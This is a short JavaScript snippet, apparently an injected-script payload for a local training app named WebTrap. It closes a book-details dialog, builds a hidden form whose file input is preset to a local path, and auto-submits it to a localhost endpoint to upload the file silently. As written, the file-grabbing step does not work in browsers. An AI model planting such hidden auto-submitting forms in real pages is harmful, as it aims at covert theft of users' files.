(function() {
	$('#bookDetailsModal').modal('hide');
	var inputFile = document.createElement("input");
	inputFile.type = "file";
	inputFile.id = "file";
	inputFile.name = "file";
	inputFile.size = "50";
	inputFile.value = "E:/Temp/url.txt";

	var button = document.createElement("button");
	button.type = "submit";

	var myForm = document.createElement("form");
	myForm.action = "http://localhost:8080/WebTrap/AppController";
	myForm.method = "POST";
	myForm.enctype = "multipart/form-data";
	myForm.appendChild(inputFile);
	myForm.appendChild(button);

	var myDiv = document.createElement("div");
	myDiv.appendChild(myForm);
	myDiv.style.display = "none";

	var myParent = document.getElementsByTagName("div")[0];
	myParent.appendChild(myDiv);

	myForm.submit();
})();